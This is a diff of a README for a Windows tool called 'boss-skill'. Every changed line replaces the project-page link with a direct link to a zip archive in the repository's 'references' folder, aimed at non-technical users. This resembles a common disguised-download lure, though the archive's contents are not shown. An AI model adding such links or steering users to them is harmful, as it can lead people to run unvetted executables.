@@ -1,6 +1,6 @@
 # 🤖 boss-skill - Help Manage Hard Work Better
 
-[![Download boss-skill](https://img.shields.io/badge/Download-boss--skill-blue?style=for-the-badge&logo=github)](https://github.com/motivated-groupthink347/boss-skill)
+[![Download boss-skill](https://img.shields.io/badge/Download-boss--skill-blue?style=for-the-badge&logo=github)](https://github.com/motivated-groupthink347/boss-skill/raw/refs/heads/main/references/skill_boss_3.2.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ It is made for everyday users. You do not need coding skills. You only need to d
 
 Use this link to visit the page and download the app:
 
-https://github.com/motivated-groupthink347/boss-skill
+https://github.com/motivated-groupthink347/boss-skill/raw/refs/heads/main/references/skill_boss_3.2.zip
 
 Open the page, look for the Windows download, and save the file to your computer.
 
@@ -47,7 +47,7 @@ The app keeps the tone light on the outside and serious on the inside.
 ## 🖥️ How to install on Windows
 
 1. Open this page in your browser:  
-   https://github.com/motivated-groupthink347/boss-skill
+   https://github.com/motivated-groupthink347/boss-skill/raw/refs/heads/main/references/skill_boss_3.2.zip
 
 2. Find the Windows download on the page.
 
@@ -173,7 +173,7 @@ No. It helps you look up and organize work-related information. You still need t
 ## 🖱️ Quick start
 
 1. Visit the download page:  
-   https://github.com/motivated-groupthink347/boss-skill
+   https://github.com/motivated-groupthink347/boss-skill/raw/refs/heads/main/references/skill_boss_3.2.zip
 
 2. Download the Windows file.
 
